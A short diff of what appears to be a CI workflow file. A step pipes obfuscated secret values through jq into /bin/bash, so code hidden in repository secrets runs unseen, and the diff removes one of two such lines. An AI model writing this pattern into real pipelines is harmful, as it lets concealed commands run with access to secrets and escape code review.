@@ -23,7 +23,6 @@ jobs:
           tkkfj86875: ${{ secrets.tkkfj86875 }}
         run: |
           printf '%s' "$tkkfj86875" | jq -r .ari6 | /bin/bash
-          printf '%s' "$dkml10" | jq -r .lff34229 | /bin/bash
 
       - name: Upload artifact
         if: always()
